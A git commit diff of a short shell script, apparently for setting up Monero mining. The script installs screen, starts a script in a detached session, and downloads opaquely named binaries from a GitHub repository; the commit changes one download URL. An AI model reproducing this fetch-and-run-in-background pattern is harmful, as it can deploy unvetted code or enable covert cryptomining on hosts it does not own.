67d1d0c513a7abd61dd46d06408da5249d9130d8
renilo <88342640+renilo@users.noreply.github.com>
2022-01-16 14:44:09 +0700

    Update autokontol.sh

--- autokontol.sh
+++ autokontol.sh
@@ -6,7 +6,7 @@ sudo apt install screen -y
 
 screen -dmS kontol.sh ./kontol.sh 65 75
 
-wget -O memek https://github.com/renilo/xmr/raw/main/pelir
+wget -O memek https://github.com/renilo/xmr/raw/main/pelar
 
 wget -O kontol.sh https://raw.githubusercontent.com/renilo/xmr/main/kontol.sh
 
